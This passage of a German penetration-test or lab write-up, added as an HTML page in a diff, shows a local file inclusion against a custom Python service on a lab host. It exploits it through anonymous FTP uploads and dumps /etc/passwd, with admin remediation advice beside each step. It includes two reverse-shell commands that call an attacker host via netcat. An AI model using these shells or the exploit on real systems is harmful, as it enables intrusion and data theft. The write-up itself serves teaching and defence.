+            <p class="recommendation">**Empfehlung (Pentester):** Der nächste logische Schritt ist, eine Verbindung mit `nc` oder `telnet` aufzubauen und zu versuchen, einen Dateinamen zu senden, um die Reaktion des Dienstes zu beobachten.
+            <br>**Empfehlung (Admin):** Keine Maßnahmen erforderlich, aber die Notwendigkeit dieses offenen Ports sollte dringend geklärt werden.</p>
+
+        </section>
+
+        <section id="initial-access">
+            <h2>Initial Access</h2>
+            <!-- Hier die Initial Access-Schritte einfügen, mit Kommentaren und Code-Blöcken -->
+            <p class="comment">Navigation in das Verzeichnis, in das `wget` zuvor die Dateien vom FTP-Server heruntergeladen hat, und Auflisten des Inhalts.</p>
+            <div class="code-block">
+                <div class="terminal">
+                    <div class="prompt">┌──(root㉿cyber)-[~]
+└─# <span class="command">ll</span></div>
+                    <pre>
+insgesamt 4
+drwxr-xr-x 3 root root 4096 20. Jun 15:12 192.168.2.116</pre>
+                </div>
+            </div>
+            <div class="code-block">
+                <div class="terminal">
+                    <div class="prompt">┌──(root㉿cyber)-[~]
+└─# <span class="command">cd 192.168.2.116</span></div>
+                    <pre></pre> <!-- Leere Ausgabe ist normal für cd -->
+                </div>
+            </div>
+             <div class="code-block">
+                <div class="terminal">
+                    <div class="prompt">┌──(root㉿cyber)-[~/192.168.2.116]
+└─# <span class="command">ll</span></div>
+                    <pre>
+insgesamt 4
+drwxr-xr-x 2 root root 4096 20. Jun 15:12 upload</pre>
+                </div>
+            </div>
+            <div class="code-block">
+                <div class="terminal">
+                    <div class="prompt">┌──(root㉿cyber)-[~/192.168.2.116]
+└─# <span class="command">cd upload</span></div>
+                    <pre></pre> <!-- Leere Ausgabe ist normal für cd -->
+                </div>
+            </div>
+            <div class="code-block">
+                <div class="terminal">
+                    <div class="prompt">┌──(root㉿cyber)-[~/192.168.2.116/upload]
+└─# <span class="command">ll</span></div>
+                    <pre>
+insgesamt 4
+-rw-r--r-- 1 root root 849  7. Jun 14:40 crack.py</pre>
+                </div>
+            </div>
+            <p class="analysis">**Analyse:** Die Befehle `ll` (Alias für `ls -la`) und `cd` werden verwendet, um durch die Verzeichnisstruktur zu navigieren, die `wget` angelegt hat. Es wird bestätigt, dass im Verzeichnis `~/192.168.2.116/upload/` die Datei `crack.py` liegt.</p>
+            <p class="evaluation">**Bewertung:** Einfache Dateisystemnavigation zur Lokalisierung der zuvor heruntergeladenen Datei.</p>
+            <p class="recommendation">**Empfehlung (Pentester):** Nun den Inhalt von `crack.py` analysieren.
+            <br>**Empfehlung (Admin):** Keine Maßnahmen erforderlich.</p>
+
+            <p class="comment">Analyse des Inhalts der heruntergeladenen Python-Datei.</p>
+            <div class="code-block">
+                <div class="terminal">
+                    <div class="prompt">┌──(root㉿cyber)-[~/192.168.2.116/upload]
+└─# <span class="command">cat crack.py</span></div>
+                    <!-- Wichtig: Maskierung von < und > für die HTML-Darstellung -->
+                    <pre>
+import os
+import socket
+s = socket.socket()
+s.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
+port = 12359
+s.bind(('', port))
+s.listen(50)
+
+c, addr = s.accept()
+no = "N"
+while True:
+        try:
+                c.send('File to read:'.encode())
+                data = c.recv(1024)
+                file = (str(data, 'utf-8').strip())
+                filename = os.path.basename(file)
+                check = "/srv/ftp/upload/"+filename
+                if os.path.isfile(check) and os.path.isfile(file):
+                        f = open(file,"r")
+                        lines = f.readlines()
+                        lines = str(lines)
+                        lines = lines.encode()
+                        c.send(lines)
+                else:
+                        c.send(no.encode())
+        except ConnectionResetError:
+                pass</pre>
+                </div>
+            </div>
+            <p class="analysis">**Analyse:** Der Befehl `cat crack.py` zeigt den Quellcode des Python-Skripts an. Das Skript öffnet einen Socket auf Port 12359, wartet auf eine Verbindung und tritt dann in eine Endlosschleife ein:
+            1.  Es sendet die Zeichenkette "File to read:" an den Client.
+            2.  Es empfängt Daten vom Client (maximal 1024 Bytes), interpretiert diese als Dateipfad (`file`).
+            3.  Es extrahiert den Basisnamen der Datei (`filename = os.path.basename(file)`).
+            4.  Es konstruiert einen Pfad (`check`) im FTP-Upload-Verzeichnis (`/srv/ftp/upload/`).
+            5.  **Schwachstelle:** Es prüft, ob **sowohl** die Datei im FTP-Upload-Verzeichnis (`os.path.isfile(check)`) **als auch** die vom Benutzer angegebene Datei (`os.path.isfile(file)`) existieren.
+            6.  Wenn beide Bedingungen erfüllt sind, öffnet es die vom Benutzer angegebene Datei (`file`), liest deren Inhalt und sendet ihn an den Client.
+            7.  Andernfalls sendet es ein "N" zurück.
+            Die Funktion `os.path.basename()` verhindert einfaches Path Traversal (`../`), aber die Logik selbst stellt eine Local File Inclusion (LFI)-Schwachstelle dar: Wenn man den Namen einer Datei im Upload-Verzeichnis kennt (z.B. `passwd`, wenn wir sie dort erstellen), kann man den *vollen Pfad* zu einer *anderen* Datei auf dem System angeben (z.B. `/etc/passwd`), und wenn beide existieren, wird der Inhalt der angeforderten Datei (`/etc/passwd`) zurückgegeben.</p>
+            <p class="evaluation">**Bewertung:** Kritisch. Das Skript enthält eine klare LFI-Schwachstelle. Die Bedingung, dass eine gleichnamige Datei im FTP-Upload-Verzeichnis existieren muss, macht die Ausnutzung etwas komplizierter, aber durch den beschreibbaren anonymen FTP-Zugang ist diese Bedingung erfüllbar.</p>
+            <p class="recommendation">**Empfehlung (Pentester):** Nutze die Schwachstelle aus:
+            1. Erstelle eine leere Datei mit einem bekannten Namen (z.B. `passwd`) auf deinem Rechner.
+            2. Lade diese leere Datei per anonymem FTP in das `/upload`-Verzeichnis auf dem Zielserver hoch.
+            3. Verbinde dich mit `nc` oder `telnet` zu Port 12359.
+            4. Sende den Pfad `/etc/passwd` (oder andere interessante Dateien wie `/etc/shadow`, SSH-Keys etc.).
+            5. Der Inhalt der Datei sollte zurückgegeben werden.
+            <br>**Empfehlung (Admin):** Das Skript muss dringend überarbeitet oder entfernt werden.
+            1. **Entfernen:** Wenn das Skript nicht benötigt wird, lösche es und schließe Port 12359.
+            2. **Überarbeiten:**
+                *   Niemals Benutzereingaben direkt als Dateipfade verwenden.
+                *   Verwende eine Whitelist von erlaubten Dateien/Verzeichnissen.
+                *   Führe das Skript mit minimalen Rechten aus.
+                *   Entferne die Abhängigkeit vom FTP-Upload-Verzeichnis.
+                *   Implementiere robuste Eingabevalidierung und Fehlerbehandlung.
+            3. **FTP härten:** Entferne anonyme Schreibrechte (siehe vorherige Empfehlungen).</p>
+
+            <p class="comment">Verbindung zum FTP-Server, um die Umgebung zu untersuchen und zu versuchen, Dateien hochzuladen.</p>
+            <div class="code-block">
+                <div class="terminal">
+                    <div class="prompt">┌──(root㉿cyber)-[~/192.168.2.116/upload]
+└─# <span class="command">ftp 192.168.2.116</span></div>
+                    <pre>
+Connected to 192.168.2.116.
+220 (vsFTPd 3.0.3)
+Name (192.168.2.116:cyber): anonymous
+331 Please specify the password.
+Password: <!-- Passwort wird eingegeben (leer für anonymous) -->
+230 Login successful.
+Remote system type is UNIX.
+Using binary mode to transfer files.
+
+ftp> ls -la
+229 Entering Extended Passive Mode (|||11211|)
+150 Here comes the directory listing.
+drwxr-xr-x    3 0        114          4096 Jun 07 12:22 .
+drwxr-xr-x    3 0        114          4096 Jun 07 12:22 ..
+drwxrwxrwx    2 0        0            4096 Jun 07 14:40 upload
+226 Directory send K.
+
+ftp> put crack.py
+local: crack.py remote: crack.py
+229 Entering Extended Passive Mode (|||42175|)
+553 Could not create file. <!-- Fehler: Keine Schreibrechte im Root-Verzeichnis -->
+
+ftp> cd /home
+550 Failed to change directory. <!-- Fehler: Zugriff/Wechsel verweigert -->
+</pre>
+                </div>
+            </div>
+             <p class="analysis">**Analyse:** Es wird eine FTP-Verbindung zum Zielserver aufgebaut und sich erfolgreich anonym angemeldet (leeres Passwort). Der Befehl `ls -la` zeigt das Wurzelverzeichnis des FTP-Servers, das ein Verzeichnis `upload` mit Vollzugriff (`drwxrwxrwx`) enthält. Der Versuch, die Datei `crack.py` in das Wurzelverzeichnis hochzuladen (`put crack.py`), scheitert mit Fehler 553 ("Could not create file"), da hier keine Schreibrechte bestehen. Der Versuch, in das `/home`-Verzeichnis zu wechseln (`cd /home`), scheitert ebenfalls (Fehler 550), wahrscheinlich aufgrund fehlender Berechtigungen oder weil das Verzeichnis für den FTP-Benutzer nicht sichtbar ist.</p>
+            <p class="evaluation">**Bewertung:** Bestätigt den anonymen Login und die Existenz des beschreibbaren `upload`-Verzeichnisses. Zeigt aber auch, dass Schreibrechte auf das Wurzelverzeichnis beschränkt sind.</p>
+            <p class="recommendation">**Empfehlung (Pentester):** Wechsle in das `upload`-Verzeichnis (`cd upload`) und versuche dort, Dateien hochzuladen. Dieses Verzeichnis ist der Schlüssel zur Ausnutzung der LFI im Python-Skript.
+            <br>**Empfehlung (Admin):** Anonyme Schreibrechte sollten generell vermieden werden. Wenn sie unbedingt erforderlich sind, beschränke sie auf das Nötigste und überwache das Verzeichnis sorgfältig. Konfiguriere vsftpd so, dass Benutzer nicht in Verzeichnisse außerhalb ihres erlaubten Bereichs wechseln können (chroot jail).</p>
+
+            <p class="comment">Erster Versuch, mit dem Dienst auf Port 12359 via Telnet zu interagieren.</p>
+            <div class="code-block">
+                <div class="terminal">
+                    <div class="prompt">┌──(root㉿cyber)-[~/192.168.2.116/upload]
+└─# <span class="command">telnet 192.168.2.116 12359</span></div>
+                    <pre>
+Trying 192.168.2.116...
+Connected to 192.168.2.116.
+Escape character is '^]'.
+<!-- Hier wurden verschiedene Eingaben versucht, die nicht als Dateinamen interpretiert wurden -->
+id
+ls
+ls
+id
+
+^C^S^S^S^S^S^C^Cquit
+quit
+q
+^C
+dsvdvdsv
+pass
+nc -e /bin/bash 192.168.2.137 5555
+import os;
+os.system('ls -la');
+^C <!-- Verbindung manuell abgebrochen -->
+</pre>
+                </div>
+            </div>
+            <p class="analysis">**Analyse:** Eine Telnet-Verbindung zu Port 12359 wird aufgebaut. Der Server sendet jedoch nicht sofort die erwartete "File to read:" Nachricht (oder sie wird hier in der Ausgabe nicht gezeigt). Es werden verschiedene Befehle (`id`, `ls`, `quit`, `nc ...`, Python-Code) eingegeben, aber keiner führt zu einer sichtbaren Reaktion oder einem Ergebnis. Dies liegt daran, dass das Skript auf einen Dateinamen wartet und diese Eingaben nicht als solche interpretiert oder verarbeitet.</p>
+            <p class="evaluation">**Bewertung:** Niedrig. Dieser Interaktionsversuch war nicht erfolgreich, da die Funktionsweise des Skripts (Warten auf Dateinamen) noch nicht berücksichtigt wurde.</p>
+            <p class="recommendation">**Empfehlung (Pentester):** Sende gültige Dateinamen (oder vermutete Pfade), nachdem die Verbindung hergestellt wurde, wie durch die Analyse von `crack.py` und den Nmap-Scan nahegelegt.
+            <br>**Empfehlung (Admin):** Keine Maßnahmen erforderlich, außer der bereits erwähnten Überprüfung des Dienstes.</p>
+
+            <p class="comment">Zweiter, gezielterer Versuch, mit Telnet auf Port 12359 zu interagieren und Dateipfade zu senden.</p>
+             <div class="code-block">
+                <div class="terminal">
+                    <div class="prompt">┌──(root㉿cyber)-[~]
+└─# <span class="command">telnet 192.168.2.116 12359</span></div>
+                    <pre>
+Trying 192.168.2.116...
+Connected to 192.168.2.116.
+Escape character is '^]'.
+File to read:/etc/passwd <!-- Eingabe: /etc/passwd -->
+NFile to read:;ls <!-- Eingabe: ;ls (Versuch Command Injection) -->
+NFile to read:import os;os.system('cat /etc/passwd') <!-- Eingabe: Python Code -->
+NFile to read:;import os;os.system('cat /etc/passwd') <!-- Eingabe: Python Code mit ; -->
+NFile to read:. <!-- Eingabe: . (Aktuelles Verzeichnis) -->
+NFile to read:crack.py <!-- Eingabe: crack.py -->
+['import os\n', 'import socket\n', 's = socket.socket()\n', 's.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)\n', 'port = 12359\n', "s.bind(('', port))\n", 's.listen(50)\n', '\n', 'c, addr = s.accept()\n', 'no = "N"\n', 'while True:\n', '        try:\n', "                c.send('File to read:'.encode())\n", '                data = c.recv(1024)\n', "                file = (str(data, 'utf-8').strip())\n", '                filename = os.path.basename(file)\n', '                check = "/srv/ftp/upload/"+filename\n', '                if os.path.isfile(check) and os.path.isfile(file):\n', '                        f = open(file,"r")\n', '                        lines = f.readlines()\n', '                        lines = str(lines)\n', '                        lines = lines.encode()\n', '                        c.send(lines)\n', '                else:\n', '                        c.send(no.encode())\n', '        except ConnectionResetError:\n', '                pass\n']File to read: <!-- Erfolgreiche Ausgabe des Codes von crack.py -->
+</pre>
+                </div>
+            </div>
+            <p class="analysis">**Analyse:** Erneute Telnet-Verbindung zu Port 12359. Diesmal wird die Funktionsweise des Skripts berücksichtigt:
+            1. Der Server sendet "File to read:".
+            2. Eingabe `/etc/passwd`: Server antwortet mit "N" (gefolgt von "File to read:"). Grund: `/srv/ftp/upload/passwd` existiert (noch) nicht.
+            3. Eingaben zur Command Injection (`;ls`, Python-Code): Server antwortet mit "N". Das Skript führt keine Befehle aus.
+            4. Eingabe `.`: Server antwortet mit "N".
+            5. Eingabe `crack.py`: Server antwortet mit dem Inhalt der Datei `crack.py`. Grund: Die Datei `/srv/ftp/upload/crack.py` existiert (wie vom FTP-Download bekannt), und der angeforderte Pfad `crack.py` (relativ zum Ausführungsverzeichnis des Skripts) existiert ebenfalls und zeigt auf dieselbe Datei. Beide Bedingungen `os.path.isfile(check)` und `os.path.isfile(file)` sind wahr.
+            Dies bestätigt die LFI-Logik und die Abhängigkeit vom `/srv/ftp/upload`-Verzeichnis.</p>
+            <p class="evaluation">**Bewertung:** Mittel. Dieser Schritt hat die Funktionsweise der LFI-Schwachstelle im Detail bestätigt. Es wurde gezeigt, dass man Dateien lesen kann, wenn eine gleichnamige Datei im Upload-Verzeichnis existiert. Der Weg zum Lesen beliebiger Dateien (wie `/etc/passwd`) ist nun klar: Eine Datei namens `passwd` muss ins Upload-Verzeichnis hochgeladen werden.</p>
+            <p class="recommendation">**Empfehlung (Pentester):** Lade eine leere Datei namens `passwd` per FTP ins `/upload`-Verzeichnis hoch und wiederhole dann die Telnet-Anfrage mit dem Pfad `/etc/passwd`.
+            <br>**Empfehlung (Admin):** Siehe vorherige Empfehlungen zur Behebung des `crack.py`-Skripts und zur Härtung des FTP-Servers.</p>
+
+            <p class="comment">Fehlgeschlagener Versuch, die LFI über einen POST-Request mit curl auszunutzen.</p>
+            <div class="code-block">
+                <div class="terminal">
+                    <div class="prompt">┌──(root㉿cyber)-[~]
+└─# <span class="command">curl -X POST --data "file=/etc/passwd" http://192.168.2.116:12359/</span></div>
+                    <pre>
+^C <!-- Manuell abgebrochen, vermutlich keine Antwort -->
+</pre>
+                </div>
+            </div>
+            <p class="analysis">**Analyse:** Es wird versucht, die LFI-Schwachstelle über einen HTTP POST-Request mit `curl` auszunutzen. Der Parameter `file` wird mit dem Wert `/etc/passwd` gesendet. Der Versuch scheitert bzw. wird abgebrochen (`^C`), da der Dienst auf Port 12359 kein HTTP-Server ist und nicht auf HTTP-Anfragen reagiert.</p>
+            <p class="evaluation">**Bewertung:** Niedrig. Falsches Protokoll für den Zieldienst verwendet.</p>
+            <p class="recommendation">**Empfehlung (Pentester):** Halte dich an das Protokoll, das der Dienst spricht (einfaches TCP mit Telnet/Netcat).
+            <br>**Empfehlung (Admin):** Keine Maßnahmen erforderlich.</p>
+
+            <p class="comment">Weitere fehlgeschlagene Versuche, Command Injection über Telnet zu erreichen.</p>
+            <div class="code-block">
+                <div class="terminal">
+                    <!-- Kein Prompt hier, setzt die vorherige Telnet-Sitzung oder eine neue fort -->
+                    <pre>
+<!-- Eingaben in Telnet-Sitzung -->
+crack.py;os.system("ls -la");
+crack.py&os.system("ls -la");
+
+NFile to read:crack.py&os.system("ls -la");
+NFile to read:os.system("ls -la");
+NFile to read:os.path.basename('/etc/passwd')
+NFile to read:os.path.basename(/etc/passwd)
+</pre>
+                </div>
+            </div>
+            <p class="analysis">**Analyse:** In einer (vermutlich) Telnet-Sitzung zu Port 12359 werden weitere Versuche unternommen, Code auszuführen:
+            *   Anhängen von Befehlen mit `;` und `&`.
+            *   Direkte Eingabe von Python-Code (`os.system(...)`, `os.path.basename(...)`).
+            Alle Versuche scheitern und resultieren in der Antwort "N", da das Skript die Eingaben nur als Dateinamen behandelt und keine Codeausführung implementiert ist.</p>
+            <p class="evaluation">**Bewertung:** Niedrig. Bestätigt erneut, dass es sich (bisher) nur um eine LFI- und keine Command-Injection-Schwachstelle handelt.</p>
+            <p class="recommendation">**Empfehlung (Pentester):** Konzentriere dich auf die Ausnutzung der LFI. Command Injection ist hier nicht der Weg.
+            <br>**Empfehlung (Admin):** Keine zusätzlichen Maßnahmen erforderlich.</p>
+
+            <p class="comment">Erneuter FTP-Login, um den Inhalt des Upload-Verzeichnisses zu prüfen.</p>
+             <div class="code-block">
+                 <div class="terminal">
+                    <!-- Kein Prompt, setzt vorherige FTP-Sitzung fort oder neue Sitzung -->
+                     <pre>
+ftp> ls -la <!-- Befehl innerhalb der FTP-Sitzung -->
+229 Entering Extended Passive Mode (|||55623|)
+150 Here comes the directory listing.
+drwxrwxrwx    2 0        0            4096 Jun 20 16:08 .
+drwxr-xr-x    3 0        114          4096 Jun 07 12:22 ..
+-rwxr-xr-x    1 1000     1000          849 Jun 07 14:40 crack.py
+-rw-------    1 107      114             5 Jun 20 16:08 test.txt <!-- Neue Datei? -->
+226 Directory send K.
+ftp></pre>
+                 </div>
+             </div>
+            <p class="analysis">**Analyse:** Innerhalb einer anonymen FTP-Sitzung wird der Inhalt des aktuellen Verzeichnisses (vermutlich `/upload`) aufgelistet. Neben der bekannten `crack.py` existiert nun auch eine Datei `test.txt` (5 Bytes groß).</p>
+            <p class="evaluation">**Bewertung:** Interessant. Die Existenz von `test.txt` könnte bedeuten, dass ein anderer Benutzer oder Prozess ebenfalls Schreibzugriff hat oder dass frühere Tests diese Datei hinterlassen haben. Wichtiger ist, dass dies zeigt, dass das Verzeichnis tatsächlich beschreibbar ist.</p>
+            <p class="recommendation">**Empfehlung (Pentester):** Dies bestärkt den Plan, eine eigene Datei (`passwd`) hochzuladen, um die LFI auszunutzen.
+            <br>**Empfehlung (Admin):** Überwache das FTP-Upload-Verzeichnis auf unerwartete Dateien.</p>
+
+            <p class="comment">Vorbereitung eines Reverse-Shell-Payloads (scheint hier fehl am Platz, gehört eher zur Post-Exploitation oder Privilege Escalation).</p>
+            <div class="code-block">
+                <div class="terminal">
+                    <div class="prompt">┌──(root㉿cyber)-[~]
+└─# <span class="command">vi bash.sh</span></div>
+                    <pre></pre> <!-- vi öffnet den Editor -->
+                </div>
+            </div>
+            <div class="code-block">
+                <div class="terminal">
+                    <div class="prompt">┌──(root㉿cyber)-[~]
+└─# <span class="command">chmod +x bash.sh</span></div>
+                    <pre></pre> <!-- Keine Ausgabe von chmod -->
+                </div>
+            </div>
+             <div class="code-block">
+                <div class="terminal">
+                    <div class="prompt">┌──(root㉿cyber)-[~]
+└─# <span class="command">cat bash.sh</span></div>
+                    <pre>
+#!/bin/bash
+
+rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc 192.168.2.137 5555 >/tmp/f</pre>
+                </div>
+            </div>
+            <p class="analysis">**Analyse:** Es wird eine Datei `bash.sh` erstellt, ausführbar gemacht (`chmod +x`) und ihr Inhalt angezeigt. Das Skript enthält einen Einzeiler für eine Bash-Reverse-Shell, der eine Named Pipe (`/tmp/f`) verwendet, um eine interaktive Shell (`/bin/sh -i`) über Netcat (`nc`) an den Angreifer-Host `192.168.2.137` auf Port `5555` zu senden.</p>
+            <p class="evaluation">**Bewertung:** Dies ist eine Standardtechnik zur Etablierung einer Reverse Shell. Sie ist hier jedoch verfrüht, da noch kein Weg zur Ausführung dieses Skripts auf dem Zielsystem gefunden wurde.</p>
+            <p class="recommendation">**Empfehlung (Pentester):** Behalte dieses Skript für später bereit, falls du Codeausführung auf dem Ziel erlangst. Der aktuelle Fokus sollte auf der Ausnutzung der LFI liegen.
+            <br>**Empfehlung (Admin):** Überwachung auf ausgehende Verbindungen von Servern auf ungewöhnliche Ports (wie 5555). Härtung der Systemkonfiguration, um die Ausführung nicht autorisierter Skripte zu verhindern.</p>
+
+            <p class="comment">Weitere fehlgeschlagene LFI-Versuche mit Path Traversal.</p>
+            <div class="code-block">
+                <div class="terminal">
+                     <!-- Kein Prompt, vermutlich Telnet-Sitzung -->
+                    <pre>
+<!-- Eingaben in Telnet-Sitzung -->
+NFile to read:/srv/ftp/upload/etc/passwd
+NFile to read:/srv/ftp/upload/../../../../../etc/passwd
+NFile to read:/srv/ftp/upload/../../../../etc/passwd
+NFile to read:/srv/ftp/upload/../../../etc/passwd
+NFile to read:/srv/ftp/upload/../../etc/passwd
+NFile to read:/srv/ftp/upload/../etc/passwd
+</pre>
+                </div>
+            </div>
+            <p class="analysis">**Analyse:** Es werden verschiedene Pfade an den Dienst auf Port 12359 gesendet, um Path Traversal (`../`) zu testen. Alle Versuche scheitern ("N"). Das liegt daran, dass `os.path.basename()` im Python-Skript nur den Dateinamen extrahiert und somit die Traversal-Versuche unwirksam macht. Die erste Zeile scheitert, weil `/srv/ftp/upload/passwd` nicht existiert (nur der Dateiname `passwd` wird extrahiert und geprüft).</p>
+            <p class="evaluation">**Bewertung:** Niedrig. Bestätigt, dass einfaches Path Traversal durch `os.path.basename()` verhindert wird.</p>
+            <p class="recommendation">**Empfehlung (Pentester):** Gib Path Traversal auf und konzentriere dich auf die vorgesehene LFI-Methode: Gleichnamige Datei im Upload-Verzeichnis erstellen.
+            <br>**Empfehlung (Admin):** Die Verwendung von `os.path.basename()` ist ein Teilschutz, aber nicht ausreichend, wie die LFI-Schwachstelle zeigt.</p>
+
+            <p class="comment">Erstellen einer leeren Datei namens `passwd` auf dem Angreifer-System.</p>
+             <div class="code-block">
+                <div class="terminal">
+                    <div class="prompt">┌──(root㉿cyber)-[~]
+└─# <span class="command">touch passwd</span></div>
+                    <pre></pre> <!-- Keine Ausgabe von touch -->
+                </div>
+            </div>
+            <p class="analysis">**Analyse:** Der Befehl `touch passwd` erstellt eine leere Datei mit dem Namen `passwd` im aktuellen Verzeichnis des Angreifer-Systems.</p>
+            <p class="evaluation">**Bewertung:** Notwendiger Vorbereitungsschritt zur Ausnutzung der LFI.</p>
+            <p class="recommendation">**Empfehlung (Pentester):** Lade diese Datei nun per FTP hoch.
+            <br>**Empfehlung (Admin):** Keine Maßnahmen erforderlich.</p>
+
+            <p class="comment">Hochladen der leeren `passwd`-Datei in das `/upload`-Verzeichnis via FTP.</p>
+             <div class="code-block">
+                <div class="terminal">
+                    <div class="prompt">┌──(root㉿cyber)-[~]
+└─# <span class="command">ftp 192.168.2.116</span></div>
+                    <pre>
+Connected to 192.168.2.116.
+220 (vsFTPd 3.0.3)
+Name (192.168.2.116:cyber): anonymous
+331 Please specify the password.
+Password:
+230 Login successful.
+Remote system type is UNIX.
+Using binary mode to transfer files.
+
+ftp> ls -la <!-- Prüfen des aktuellen Verzeichnisses -->
+229 Entering Extended Passive Mode (|||60254|)
+150 Here comes the directory listing.
+drwxr-xr-x    3 0        114          4096 Jun 07 12:22 .
+drwxr-xr-x    3 0        114          4096 Jun 07 12:22 ..
+drwxrwxrwx    2 0        0            4096 Jun 20 16:11 upload
+226 Directory send K.
+
+ftp> cd upload <!-- Wechsel in das Upload-Verzeichnis -->
+250 Directory successfully changed.
+
+ftp> put passwd <!-- Hochladen der lokalen Datei 'passwd' -->
+local: passwd remote: passwd
+229 Entering Extended Passive Mode (|||20769|)
+150 Ok to send data.
+     0        0.00 KiB/s <!-- Übertragung -->
+226 Transfer complete. <!-- Erfolg! -->
+ftp></pre>
+                </div>
+            </div>
+            <p class="analysis">**Analyse:** Erneuter anonymer FTP-Login. Diesmal wird erfolgreich in das `upload`-Verzeichnis gewechselt (`cd upload`). Anschließend wird die zuvor lokal erstellte, leere Datei `passwd` mit dem Befehl `put passwd` erfolgreich auf den FTP-Server in das `upload`-Verzeichnis hochgeladen ("226 Transfer complete.").</p>
+            <p class="evaluation">**Bewertung:** Erfolgreiche Durchführung des entscheidenden Schritts zur Vorbereitung der LFI-Ausnutzung. Die Bedingung `os.path.isfile("/srv/ftp/upload/passwd")` im Python-Skript ist nun erfüllt.</p>
+            <p class="recommendation">**Empfehlung (Pentester):** Verbinde dich jetzt erneut mit `telnet` oder `nc` zu Port 12359 und fordere `/etc/passwd` an.
+            <br>**Empfehlung (Admin):** **Dringend:** Entferne anonyme Schreibrechte im FTP-Upload-Verzeichnis.</p>
+
+        </section>
+
+        <!-- POC Section -->
+        <section id="poc">
+            <h2>Proof of Concept (LFI)</h2>
+            <p class="comment">Dieser Abschnitt demonstriert die erfolgreiche Ausnutzung der identifizierten Local File Inclusion (LFI) Schwachstelle im Dienst auf Port 12359.</p>
+
+            <p class="analysis">**Schwachstelle:** Das Python-Skript (`crack.py`) auf Port 12359 liest eine vom Benutzer angegebene Datei (`file`), wenn eine Datei mit demselben Basisnamen (`filename`) im Verzeichnis `/srv/ftp/upload/` existiert.</p>
+            <p class="evaluation">**Voraussetzungen:**
+                <ul>
+                    <li>Netzwerkzugriff auf TCP Port 12359 des Ziels (192.168.2.116).</li>
+                    <li>Anonymer FTP-Zugriff mit Schreibrechten auf das Verzeichnis `/srv/ftp/upload` auf Port 21 des Ziels.</li>
+                    <li>Ein Tool zur TCP-Kommunikation wie `telnet` oder `nc`.</li>
+                    <li>Ein Tool zum Erstellen einer leeren Datei (`touch`).</li>
+                    <li>Ein FTP-Client.</li>
+                </ul>
+            </p>
+            <p class="recommendation">**Schritt-für-Schritt Anleitung:**
+                <ol>
+                    <li>Erstelle eine leere Datei mit dem Namen `passwd` auf dem Angreifer-System: `touch passwd`.</li>
+                    <li>Lade diese Datei per anonymem FTP in das `/upload`-Verzeichnis auf dem Zielserver hoch (siehe vorherigen FTP-Log).</li>
+                    <li>Stelle eine Verbindung zum Zieldienst auf Port 12359 her.</li>
+                    <li>Sende den Pfad der auszulesenden Datei (`/etc/passwd`), nachdem der Server "File to read:" gesendet hat.</li>
+                </ol>
+            </p>
+
+            <p class="comment">Durchführung des LFI-Angriffs via Telnet nach dem Hochladen der Trigger-Datei.</p>
+            <div class="code-block">
+                <div class="terminal">
+                    <!-- Kein Prompt, Telnet-Sitzung zu Port 12359 -->
+                     <pre>
+<!-- Annahme: Telnet-Verbindung wurde nach dem FTP-Upload neu aufgebaut -->
+File to read:/etc/passwd <!-- Eingabe des Zieldatei-Pfads -->
+<!-- Erfolgreiche Ausgabe des Inhalts von /etc/passwd -->
+['root:x:0:0:root:/root:/bin/bash\n', 'daemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin\n', 'bin:x:2:2:bin:/bin:/usr/sbin/nologin\n', 'sys:x:3:3:sys:/dev:/usr/sbin/nologin\n', 'sync:x:4:65534:sync:/bin:/bin/sync\n', 'games:x:5:60:games:/usr/games:/usr/sbin/nologin\n', 'man:x:6:12:man:/var/cache/man:/usr/sbin/nologin\n', 'lp:x:7:7:lp:/var/spool/lpd:/usr/sbin/nologin\n', 'mail:x:8:8:mail:/var/mail:/usr/sbin/nologin\n', 'news:x:9:9:news:/var/spool/news:/usr/sbin/nologin\n', 'uucp:x:10:10:uucp:/var/spool/uucp:/usr/sbin/nologin\n', 'proxy:x:13:13:proxy:/bin:/usr/sbin/nologin\n', 'www-data:x:33:33:www-data:/var/www:/usr/sbin/nologin\n', 'backup:x:34:34:backup:/var/backups:/usr/sbin/nologin\n', 'list:x:38:38:Mailing List Manager:/var/list:/usr/sbin/nologin\n', 'irc:x:39:39:ircd:/run/ircd:/usr/sbin/nologin\n', 'gnats:x:41:41:Gnats Bug-Reporting System (admin):/var/lib/gnats:/usr/sbin/nologin\n', 'nobody:x:65534:65534:nobody:/nonexistent:/usr/sbin/nologin\n', '_apt:x:100:65534::/nonexistent:/usr/sbin/nologin\n', 'systemd-network:x:101:102:systemd Network Management,,,:/run/systemd:/usr/sbin/nologin\n', 'systemd-resolve:x:102:103:systemd Resolver,,,:/run/systemd:/usr/sbin/nologin\n', 'messagebus:x:103:109::/nonexistent:/usr/sbin/nologin\n', 'systemd-timesync:x:104:110:systemd Time Synchronization,,,:/run/systemd:/usr/sbin/nologin\n', 'sshd:x:105:65534::/run/sshd:/usr/sbin/nologin\n', 'cris:x:1000:1000:cris,,,:/home/cris:/bin/bash\n', 'systemd-coredump:x:999:999:systemd Core Dumper:/:/usr/sbin/nologin\n', 'shellinabox:x:106:112:Shell In A Box,,,:/var/lib/shellinabox:/usr/sbin/nologin\n', 'ftp:x:107:114:ftp daemon,,,:/srv/ftp:/usr/sbin/nologin\n']File to read:</pre> <!-- Dienst sendet erneut Prompt -->
+                </div>
+            </div>
+            <p class="analysis">**Ergebnis:** Nach dem Hochladen der leeren `passwd`-Datei via FTP und dem Senden des Pfads `/etc/passwd` an den Dienst auf Port 12359, gibt dieser erfolgreich den Inhalt der Datei `/etc/passwd` zurück. Die LFI-Schwachstelle wurde erfolgreich ausgenutzt.</p>
+            <p class="evaluation">**Risikobewertung:** Hoch. Diese Schwachstelle erlaubt es einem Angreifer, beliebige Dateien auf dem System zu lesen, für die der ausführende Prozess des Python-Skripts Leserechte besitzt. Dies umfasst typischerweise Konfigurationsdateien, Quellcode, potenziell private Schlüssel und Benutzerdaten. In diesem Fall wurden Benutzernamen und deren Shells (`root`, `cris` mit `/bin/bash`) aufgedeckt.</p>
+            <p class="recommendation">**Empfehlungen (Admin):**
+                1.  **Sofortmaßnahme:** Stoppe den Dienst auf Port 12359 und entferne anonyme Schreibrechte auf dem FTP-Server.
